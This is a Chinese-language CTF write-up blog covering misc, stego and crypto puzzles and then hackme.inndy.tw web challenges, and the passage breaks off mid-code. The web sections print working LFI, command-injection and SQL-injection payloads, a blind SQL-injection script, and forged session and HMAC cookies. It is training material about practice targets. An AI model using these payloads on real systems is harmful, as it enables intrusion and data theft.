超简单的密码 键盘加密，低头看下键盘即可，网上也有在线解密网站 滑稽 ppt伪加密，打开后提示需要输入密码，网上找到一种方法可以绕过 破解pptx只读需要密码重命名qzxdh.pptx为qzxdh.zip，解压到当前文件夹后，切换到\\ppt之下，用记事本开启presentation.xml文件；把整块选中并删除，保存并关闭；将文件再打包成qzxdh.zip，更名为pptx即可。本文来自 qzxdh 的CSDN 博客 ，全文地址请点击：https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy 按照该方法即可打开PPT，之后拖动首页幻灯片后即可发现后面还藏着一张幻灯片，里面就有flag Fast 30 一道很常规的题目，就是不断把题目返回的信息在两秒之内发回去，这肯定不能人工操作，需要编程，本题需要提交的内容是header头里面的Flag字段的值，代码如下 123456789import requestsurl = \"http://web.bxsteam.xyz/fast/\"header = requests.get(url).headers[\"Flag\"]while True: header = requests.post(url,data=&#123;\"key\":header&#125;).headers['Flag'] ans = requests.post(url,data=&#123;\"key\":header&#125;).text if '&#123;' in ans: break MISC LSB 题目给出了提示，lsb色道隐写，丢进steg里面看一下，发现rgb的每个0通道里面，图片上方都有会多出一个黑块，说明和这三个色道有关系 提取一下这三个色道的信息，发现时png文件头 提取保存为png图片是个二维码，直接扫码就可以看到flag 爱因斯坦 右键查看图片属性，发现在备注里面有一串字符 this_is_not_password，感觉这应该是压缩包密码，猜测图片中应该隐含了一个压缩包，hed软件打开图片，直接搜索 504b0304 (zip文件头)，果然找到了，而且在右边的字符串中还看到了flag.txt字样，直接将这段提取出来，改后缀为zip，解压，提示需要密码，输入前面的字符串 this_is_not_password ，解压即可得到flag 视而不见 看了好久没思路，网上发现bmp图像的题目基本都是色道隐写的问题，于是就用stegsolve软件疯狂尝试，analyse-&gt;steteogram-&gt;solver里面修改偏移值找到了flag(233333) 鲨鱼的套路 打开数据包，追踪tcp流，发现如下内容 123456789101112hellohehei will give you flag~obut you must tell me te.he anhhao...ao~woyaohuinongcunok i will give you flag~just revice .......g.receive itUEsDBBQAAAgIANeFfErNFL6kGwAAABsAAAAcAAAAaGludF9zb21lIF90aGluZ19pc19mYWtlLnR4dEvLSUyvTs5IzUuPL87IjC9JzI&#x2F;PKQUyU&#x2F;NqAVBLAQI&#x2F;ABQACQAIANeFfErNFL6kGwAAABsAAAAcACQAAAAAAAAAIAAAAAAAAABoaW50X3NvbWUgX3RoaW5nX2lzX2Zha2UudHh0CgAgAAAAAAABABgAu7Ux1J+n0gGhDeAnl6fSAaEN4CeXp9IBUEsFBgAAAAABAAEAbgAAAFUAAAAAAA&#x3D;&#x3D;~bye~o 这段应该是base64，但是在线网站无法解码，自己尝试，发现是个压缩包，保存为zip格式 之后是zip伪加密 easy crypto 解压之后有个morse.txt，一看就是摩斯密码，解码为 keyisvigenerecipher ，提到了维吉尼亚密码，直接解密flag.txt，key就是 vigenerecipher ，然后解码即可得到flag code 题目给出了代码 1234char getCode(char orgin) &#123; return ( key1 * (orgin-97) + key2 ) % 26 + 97;&#125;code : joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm 注意题目的路径其实给出了提示 challenge/misc/fangshe/ ，最后的 fangshe 其实就是仿射的意思，意思是本题是一道放射密码的题目，就是位置为key1和key2的仿射加密，网上说了key1，key2的范围是小于26的，我们数论刚开始学，我也不是很理解，我个人感觉应该是由于题目的函数如果把key1和key2看做x和y的话，key1 * (orgin-97) + key2就是一条直线，那么key值大于26之后模26是会和前面重复的，这个以后学了得在研究一下，但是这题我们可尝试暴力破解，需要注意的是我之前以为题目给的code是密文，但事实上人家给的是明文，密文是flag ……. 123456789cipher = \"joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm\"ans = \"\"for key1 in range(0,26): for key2 in range(0,26): ans = \"\" for char in cipher: ans += chr((key1 * (ord(char)-97) + key2) % 26 + 97) if \"flag\" in ans or \"ctf\" in ans: print(ans) 跑完之后发现其中一个结果是 heiboyflagisffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa 断句一下为 hei boy,flag is ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa PS Master 题目提示的很明显了，和ps有关，那基本就是图层的问题了，但是题目的文件用PS无法打开，binwalk一下发现是个gif图片，修改文件后缀为gif，发现可以用PS打开，打开之后第二个图层是个二维码，但是无法扫描，因为定位块上都有个二哈 参照标准二维码可以知道，左上，右上，左下都应该是黑色的定位块，可以用win10自带的画图工具把右上的块复制到左上和左下，然后把二哈图案用黑色填充，处理之后如下，扫码可得flag 传感器1 题目提示了是第九届全国大学生信息安全竞赛，可以知道这个题目考察的是曼彻斯特编码，先将题目的16进制转为2进制，根据曼彻斯特编码规则，由低到高即01代表1，由高到低即10代表0，之后转化为16进制之后发现与题目ID不符，还需要每八位进行一下反转，代码如下 1234567891011121314151617def Manchester(s): ans = '' for i in range(len(s)//2): if s[i*2:i*2+2] == '01': ans += '1'; elif s[i*2:i*2+2] == '10': ans += '0'; else: print(\"error in\",i) break return anss = \"010101010101010101010101010101011001010101010101010110100110010101010101011010101010011010010110101010100110011001100110011001100110100101010101\"p = Manchester(s)flag = \"\"for i in range(len(p)//8): flag += p[i*8:i*8+8][::-1]print(hex(int(flag,2))) 我就想试试这个名字到底能够起多长 下载之后丢进stegsolve里面看一下，看一下低色道，发现是504b0304(zip文件头) 保存为zip格式，但是解压不了，WinRAR修复一下就可以解压了，将解压后的文件拖进hex里面看一下直接就看到了flag。 你的石锅拌饭 题目给出了提示信息，培根，可知是培根加密，而且题目字体用了两种字体，就更加确定了，网上查资料发现培根密码有两种加密方式 第一种方式： A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb U babaa V babab W babba X babbb Y bbaaa Z bbaab 第二种方式 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 而本题目中说了要大写，所以使用的是第一种加密方式，把题目中正常字体写成A，斜体写成B，转换之后如下 1ABAAAABABBABBBABABABAABAABAABAAABBAAAAABAABAB 对照解密即可，也可以在在线网站解密 shark 题目提示了用wireshark，是一道流量分析题目，打开之后随便浏览发现了ftp登录的信息 感觉题目应该是和ftp有关，过滤一下ftp协议 这就基本确定了本题就是获取这个flag.zip，直接 tcp contains &quot;flag&quot; ，可以看到FTP-DATA协议中传输了flag.zip的数据 追踪tcp流，然后可以看到文件头为504b0304，可以确定这就是我们要的flag.zip文件，但是不能直接保存，这样是打不开的，要按照原始数据保存 文件被加密了(不是伪加密)，需要密码，尝试前面登录ftp服务器的密码试一下，直接OK 解压后的图片没有显示格式，丢进16进制编辑器里面看一下，是个png图片，但是文件头不对，修复一下 然后保存为png图片打开就OK了 学姐真美 下载之后是一张jpg图片，发现在图片尾部之后还有东西，感觉像是png图片相关的东西，因为有IHDR块，然后在下载一张png图片对着格式修复，本图只需要修复八位即可 是一张二维码，但是只有一小部分，尝试修改图片尺寸，下图中前四个字节是宽度，后四个字节是高度，直接按我的修改为正方形即可 md5 哈希长度扩展攻击，和web里面的 is hash safe? 相同类型，所以原理就不多说了，直接上工具 12345root@kali:~# hashpumpInput Signature: 4dbe35eaea655b0a2b0d06391175b8a3Input Data: rInput Key Length: 18Input Data to Add: snow 得到结果 1265710003c2ff40389b064d3a020487bdr\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98\\x00\\x00\\x00\\x00\\x00\\x00\\x00snow 第一行md5提交，第二行在前面加上 cy 在将 \\x 换成空格，字母换成16进制表示即可，最终为 163 79 72 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 00 00 00 00 00 00 00 73 6E 6F 77 提交即可得到flag 大家来找茬 既然说了大家来找茬，感觉图片肯定有问题，估计是两张，binwalk一下发现果然是两个，foremost分离一下，本来以为是盲水印但是发现不是，百度发现了一个compare命令，试了一下居然得到个二维码，扫码得到flag 1compare 00000000.png 00000668.png 3.png 据说是个签到题 流量分析，打开之后先过滤一下http包，只有两个http，发现其中一个请求为 GET /evaltest/something/welcome/web/upload_function/upload/c2hlbGw=.php HTTP/1.1\\r\\n ，感觉应该上传了什么东西，于是过滤tcp包 tcp contains &quot;upload&quot; 发现了数据传输，从第二个开始追踪tcp流 发现了flag，但是经过了function.py的加密，不过题目也给出了代码，所以直接用它的代码解密一下即可，但是要把密文base64解密一下，代码如下 1234567891011121314151617181920212223from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64def decrypt(encrypted, passphrase): IV = encrypted[:16] aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.decrypt(encrypted[16:])def encrypt(message, passphrase): IV = message[:16] length = 16 count = len(message) padding = length - (count % length) message = message + \"\\0\" * padding aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.encrypt(message)IV = 'YUFHJKVWEASDGQDH'a = \"mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==\"b = base64.b64decode(a)print decrypt(b,\"Qq4wdrhhyEWe4qBF\") 萌萌哒 颜文字密码(aaencode)，在线解码一下 alert(“3Nc0d3.txt”) 访问一下这个txt文件，发现是brainfuck编码，之后再OOK!解码一下可以得到flag 魂斗罗 下载下来是个nes文件，要用fc模拟器打开，是个魂斗罗游戏，通关就可以得到flag，下载一个virtualnes软件即可运行，再用金手指输入一些秘籍来帮助我们通关，我只用了一个无限命的秘籍，其实用金身比较好，秘籍代码如下 然后开启1p模式通过即可，一共好像是8关 注意flag里面的字符是5不是s！ 传感器2 前面一道题目的加强版， 按照之前题目的步骤求一下ID值 1245psi: fffffed31f635055f830psi: fffffed31f425055d7 可以看出有两处不同，分别是63==42，f8==d7，看了大佬的wp后得到前面的两位是与psi有关，最后两位是校验值，校验值是从ID开始的每两位相加的和模256，例如对于第一个 fe+d3+1f+63+50+55=2f8=&gt;2f8%256=f8(注意是十六进制数)。前面的与psi对应的值可以按照比例计算即psi值为30时计算方式为 12345# py3a = (int('63',16)-int('42',16))/15 * 5b = int('42',16) - int(a)print(hex(b))# @ans=0x37 补上ID之后求校验码 123456a = \"feb757375055\"sum = 0;for i in range(len(a)//2): sum += int(a[i*2:i*2+2],16)print(hex(sum%256))# @ans=0xe8 那么最终的明文为 FFFFFEB757375055E8 猜猜看 题目说了是一个j开头的隐写工具，Google发现了下是jphs，下载了这个软件，可以在dos下运行 1jpseek.exe guess_flag.jpg flag.txt 提取需要密码，猜测了几次发现密码为flag，在flag.txt文件中发下了二进制文本，转为16进制看一下 12345s = \"\" # 此处应为flag.txt中的二进制串hex_s = \"\"for i in range(len(s)//8): hex_s += hex(int(s[i*8:i*8+8],2))[2:4]print(hex_s) 在线解码为字符串 1&lt;img src&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFR0lEQVR4nO3dQY5bNxBAQU+Q+1&#x2F;ZOUGIgHlqN2eqtoYljfQfuGiQ&#x2F;Pr9+&#x2F;cv4P&#x2F;5609&#x2F;APgOhAQBIUFASBAQEgSEBAEhQUBIEPj78G9fX19jnyOXD5onv43Dh7&#x2F;7GPkLLnmvSecnyooEASFBQEgQEBIEhAQBIUFASBAQEgROA9mDJftq8wHf09PJux&#x2F;l7hPmD8DrT5QVCQJCgoCQICAkCAgJAkKCgJAgICQIXA5kD5bMGQ&#x2F;u5oyT08mD&#x2F;YPL&#x2F;XuTP&#x2F;EdWpEgICQICAkCQoKAkCAgJAgICQJCgkA&#x2F;kH1aPqs9WDK4XDLhfZ0VCQJCgoCQICAkCAgJAkKCgJAgICQI&#x2F;MSB7ORxu3dD0qdPTv6ZrEgQEBIEhAQBIUFASBAQEgSEBAEhQaAfyH7XHZf5Ib2Tu3EP9v9e+z&#x2F;hLysSJIQEASFBQEgQEBIEhAQBIUFASBC4HMg+va1y&#x2F;22wk7PaJTfqPv1E&#x2F;bIiQUJIEBASBIQEASFBQEgQEBIEhASBrye2H26wZAS5f9z5M58oKxIEhAQBIUFASBAQEgSEBAEhQUBIEBgdyOYjyMkXnNwuerDkvQ6efqKuWZEgICQICAkCQoKAkCAgJAgICQJCgsDokcWTd63evWBuyfHIB0tmmkuG9desSBAQEgSEBAEhQUBIEBASBIQEASFB4HIgu8TTF4&#x2F;ezWon9wvn8g3Iex4AKxIEhAQBIUFASBAQEgSEBAEhQUBIEDgdWbzkQOA7k&#x2F;tql2wX3e&#x2F;pw6LPrEgQEBIEhAQBIUFASBAQEgSEBAEhQeC0Q3Zy0+LkPO7p85aXDH&#x2F;3HxZ95&#x2F;r3siJBQEgQEBIEhAQBIUFASBAQEgSEBIHLI4uX3N25ZFZ78PT8dMmv&#x2F;MQlwlYkCAgJAkKCgJAgICQICAkCQoKAkCDwbe+QnRwm7t&#x2F;4eWfJtmVHFsNPISQICAkCQoKAkCAgJAgICQJCgsDlHbJLdiYOD9022H+x73c9A9mRxfBxQoKAkCAgJAgICQJCgoCQICAkCPR3yN6ZvKF1cgS55Duc3BQ8OSXfM8a1IkFASBAQEgSEBAEhQUBIEBASBIQEgdNAdslJvN916prPT&#x2F;P3WnJR7MGe04ytSBAQEgSEBAEhQUBIEBASBIQEASFBoL9DNp92LRm63b1gPnV9+pTm&#x2F;SPj6yfKigQBIUFASBAQEgSEBAEhQUBIEBASBC7vkD1YMj+9s+Qo5oMlxyNPWnIusYEsfJyQICAkCAgJAkKCgJAgICQICAkC&#x2F;Q7ZgyWTtUmTM+inL6U9eOLvsiJBQEgQEBIEhAQBIUFASBAQEgSEBIHTQHbJrtX9m0yXDC73f4w7kwcdX394KxIEhAQBIUFASBAQEgSEBAEhQUBIEDgNZJ&#x2F;emjq5G3dywjtpzw2tFy84zIoEASFBQEgQEBIEhAQBIUFASBAQEgQujyx+emI4uZN0cl&#x2F;t03t4J9&#x2F;rE3+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPR3yE7e+HlnydbUJbPa3J5dq&#x2F;&#x2F;mE7+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPQD2adNDkmX7DI+mPyTl5xm7A5Z+JOEBAEhQUBIEBASBIQEASFBQEgQ+IkD2SWT0HwEObmVeNKS7b3nr9eKBAEhQUBIEBASBIQEASFBQEgQEBIE+oHsknHnnckh6eG9Jg9VXvJeB&#x2F;kO2U9cL2tFgoCQICAkCAgJAkKCgJAgICQICAkCX58YTm3w9G2wk&#x2F;8r9&#x2F;TI+JoVCQJCgoCQICAkCAgJAkKCgJAgICQInAaywH9kRYKAkCAgJAgICQJCgoCQICAkCAgJAkKCwD96oQOE684L1QAAAABJRU5ErkJggg&#x3D;&#x3D;&quot;&gt;&lt;&#x2F;img&gt; 一看就是个base64编码的图片，解码一下是个二维码，扫码即可得到flag 这题还发现个stegdetect工具，收获挺大。 REVERSE Gift 题目要让使用jeb，但是没找到工具，所以使用了kali下面的apktools，直接运行命令进行反编译 1apktool d Gift.apk 在Gift/smali/com/example/gift/flag.smail文件夹下面即可看到flag。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"hackme-web题解","slug":"hackme","date":"2018-08-28T15:06:49.673Z","updated":"2020-01-18T14:25:27.259Z","comments":true,"path":"2018/08/28/hackme/","link":"","permalink":"http://chaosec.top/2018/08/28/hackme/","excerpt":"前言 最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址https://hackme.inndy.tw/","text":"前言 最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址https://hackme.inndy.tw/ LFI 查看源代码 尝试读取 1https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;flag Can you read the flag&lt;?php require(‘config.php’); ?&gt;? 读取config即可得到flag 1https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;config homepage 查看代码在结尾看到一个cute.js，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可 ping 命令执行，我们可以使用 $() 或者 都可以实现执行命令的作用 1https://hackme.inndy.tw/ping/?ip=$(ls -a) 然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试 1https://hackme.inndy.tw/ping/?ip=$(tac *.*) scoreboard f12查看点击网络，查看一下消息头即可看到flag login as admin 0 题目主要源码如下 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phprequire('config.php');// table schema// user -&gt; id, user, password, is_adminif($_GET['show_source'] === '1') &#123; highlight_file(__FILE__); exit;&#125;function safe_filter($str)&#123; $strl = strtolower($str); if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') || strstr($strl, 'update') || strstr($strl, 'delete') ) &#123; return ''; &#125; return str_replace(\"'\", \"\\\\'\", $str);&#125;$_POST = array_map(safe_filter, $_POST);$user = null;// connect to databaseif(!empty($_POST['name']) &amp;&amp; !empty($_POST['password'])) &#123; $connection_string = sprintf('mysql:host=%s;dbname=%s;charset=utf8mb4', DB_HOST, DB_NAME); $db = new PDO($connection_string, DB_USER, DB_PASS); $sql = sprintf(\"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'\", $_POST['name'], $_POST['password'] ); try &#123; $query = $db-&gt;query($sql); if($query) &#123; $user = $query-&gt;fetchObject(); &#125; else &#123; $user = false; &#125; &#125; catch(Exception $e) &#123; $user = false; &#125;&#125;?&gt; 本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下 1234567891011function safe_filter($str)&#123; $strl = strtolower($str); if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') || strstr($strl, 'update') || strstr($strl, 'delete') ) &#123; return ''; &#125; return str_replace(\"'\", \"\\\\\\\\'\", $str);&#125;$_ 可以看到，题目过滤了 or 1=1 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下 1name&#x3D;guest\\&#39; or user&#x3D;0x61646d696e-- +&amp;password&#x3D;guest login as admin 0.1 上个题目的加强版，直接union注入即可，最终payload如下 1name&#x3D;guest\\&#39; union select 1,the_f14g,3,3 from h1dden_f14g-- +&amp;password&#x3D;123465 login as admin 1 题目过滤并不严格，payload如下 1admin\\&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1# login as admin 1.2 上一题的加强版，需要进行盲注，代码如下 123456789101112131415161718192021222324import requestsurl = \"https://hackme.inndy.tw/login1/index.php\"length = 1flag = \"\"# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#\"# database:login_as_admin1# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;)#\"# tables: 0bdb54c98123f5526ccaed982d2006a9,users# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;&#125;,1))=&#123;&#125;)#\"# id,4a391a11cfa831ca740cf8d00782f3a6payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#\" data = &#123;'name':r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#\", 'password':\"123\"&#125;for i in range(0,70): for j in range(32,128): data['name'] = payload1.format(str(length),str(j)) content = requests.post(url,data=data).text if \"FLAG\" in content: flag += chr(j) print('**flag:**',flag) length += 1 break login as admin 3 题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 != ，这就存在弱比较的漏洞 123456789101112131415161718function load_user()&#123; global $secret, $error; if(empty($_COOKIE['user'])) &#123; return null; &#125; $unserialized = json_decode(base64_decode($_COOKIE['user']), true); $r = hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']; if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) &#123; $error = 'Invalid session'; return false; &#125; $data = json_decode($unserialized['data'], true); return [ 'name' =&gt; $data[0], 'admin' =&gt; $data[1] ];&#125; 我们只要使$unserialized[‘sig’]的值为数字0即可绕过验证 那么我们构造一个cookie 123456789101112&lt;?php function set_user()&#123; global $user, $secret; $user = ['admin', true]; $data = json_encode($user); $sig = 0; $all = base64_encode(json_encode(['sig' =&gt; $sig, 'data' =&gt; $data])); return $all;&#125;echo set_user();?&gt; 然后刷新即可 login as admin 4 题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可 1curl -d \"name=admin\" https://hackme.inndy.tw/login4/ Login as Admin 6 1234567891011if(!empty($_POST['data'])) &#123; try &#123; $data = json_decode($_POST['data'], true); &#125; catch (Exception $e) &#123; $data = []; &#125; extract($data); if($users[$username] &amp;&amp; strcmp($users[$username], $password) == 0) &#123; $user = $username; &#125;&#125; 看代码可知存在变量覆盖漏洞，构造json数据即可 1data=&#123;\"users\":&#123;\"admin\":\"snow\"&#125;,\"username\":\"admin\",\"password\":\"snow\"&#125; login as admin 7 md5弱比较 login as admin 8 以admin登录之后，抓包发现cookie很可疑 解码之后发现is_admin字段为0，修改为1后还是不行，猜测应该是login&amp;sha512字段没有对应修改，测试之后发现该字段为前一个cookie的sha512值，到此，payload脚本如下 1234567$s = 'O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D';$s = urldecode($s);// echo $s;// echo hash('sha512',$s);$s = str_replace('\"is_admin\";b:0', '\"is_admin\";b:1', $s);echo urlencode($s).'---';echo hash('sha512',$s); login as admin8.1 前一关已经以admin身份登入取得一个flag，猜想第二个flag应该是和debug模式有关，查看session发现存在dubug字段，将其修改为1，发现不会再报错debug模式不可用，但是依然没有什么其它东西，查看cookie发现还有一个dubug_dump字段，将其修改为config.php，相应的字段长度也要修改为10 1234567$s = 'O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D';$s = urldecode($s);$s = str_replace('\"is_admin\";b:0', '\"is_admin\";b:1', $s);$s = str_replace('debug\";b:0', 'debug\";b:1', $s);$s = str_replace('debug_dump\";s:9:\"index.php', 'debug_dump\";s:10:\"config.php', $s);echo urlencode($s).'---';echo hash('sha512',$s); dafuq-manager 1 查看cookie可以发现 show_hidden 字段为 no，改为yes刷新即可得到flag dafuq-manager 2 这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag 推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分 1234case \"admin\": require \"./core/fun_admin.php\"; show_admin($GLOBALS[\"dir\"]); break; 我们跟进fun_admin.php 1234567891011121314151617181920212223242526272829function show_admin($dir) &#123; $pwd = (($GLOBALS[\"permissions\"] &amp; 2) == 2); $admin = (($GLOBALS[\"permissions\"] &amp; 4) == 4); if (!$GLOBALS[\"require_login\"]) show_error($GLOBALS[\"error_msg\"][\"miscnofunc\"]); if (isset($GLOBALS['__GET'][\"action2\"])) $action2 = $GLOBALS['__GET'][\"action2\"]; elseif (isset($GLOBALS['__POST'][\"action2\"])) $action2 = $GLOBALS['__POST'][\"action2\"]; else $action2 = \"\"; switch ($action2) &#123; case \"chpwd\": if (!$pwd) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); changepwd($dir); break; case \"adduser\": if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); adduser($dir); break; case \"edituser\": if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); edituser($dir); break; case \"rmuser\": if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); removeuser($dir); break; default: if (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); admin($admin, $dir); &#125;&#125; 主要的限制条件在于 12$pwd = (($GLOBALS[\"permissions\"] &amp; 2) == 2);$admin = (($GLOBALS[\"permissions\"] &amp; 4) == 4); 我们跟进这个变量看一下 123456789101112function activate_user($user, $pass) &#123; $data = find_user($user, $pass); if ($data == NULL) return false; $GLOBALS['__SESSION'][\"s_user\"] = $data[0]; $GLOBALS['__SESSION'][\"s_pass\"] = $data[1]; $GLOBALS[\"home_dir\"] = $data[2]; $GLOBALS[\"home_url\"] = $data[3]; $GLOBALS[\"show_hidden\"] = $data[4]; $GLOBALS[\"no_access\"] = $data[5]; $GLOBALS[\"permissions\"] = $data[6]; return true;&#125; 再定位到find_user() 1234567891011function &amp;find_user($user, $pass) &#123; $cnt = count($GLOBALS[\"users\"]); for ($i = 0;$i &lt; $cnt;++$i) &#123; if ($user == $GLOBALS[\"users\"][$i][0]) &#123; if ($pass == NULL || ($pass == $GLOBALS[\"users\"][$i][1] &amp;&amp; $GLOBALS[\"users\"][$i][7])) &#123; return $GLOBALS[\"users\"][$i]; &#125; &#125; &#125; return NULL;&#125; 可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量 123$GLOBALS[\"users\"] = array( array(\"guest\", \"084e0343a0486ff05530df6c705c8bb4\", \"./data/guest\", \"https://game1.security.ntu.st/data/guest\", 0, \"^.ht\", 1, 1),); 但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数 在fun_down.php文件中可以找到一个readfile()函数 1234567891011121314151617181920212223242526&lt;?phprequire_once ('core/secure.php');function download_item($dir, $item) &#123; $item = basename($item); if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]); if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $abs_item = get_abs_item($dir, $item); if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $browser = id_browser(); header('Content-Type: ' . (($browser == 'IE' || $browser == 'OPERA') ? 'application/octetstream' : 'application/octet-stream')); header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT'); header('Content-Transfer-Encoding: binary'); header('Content-Length: ' . filesize($abs_item)); if ($browser == 'IE') &#123; header('Content-Disposition: attachment; filename=\"' . $item . '\"'); header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Pragma: public'); &#125; else &#123; header('Content-Disposition: attachment; filename=\"' . $item . '\"'); header('Cache-Control: no-cache, must-revalidate'); header('Pragma: no-cache'); &#125; @readfile($abs_item); exit;&#125; 题目过滤部分如下 12345if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]); if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $abs_item = get_abs_item($dir, $item); if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); 我们要读取的是 .config/.htusers.php ，但是在题目的 stristr($abs_item, &#39;.php&#39;) || stristr($abs_item, &#39;config&#39;) 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中 12345678910111213141516171819function edit_file($dir, $item) &#123; if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]); if 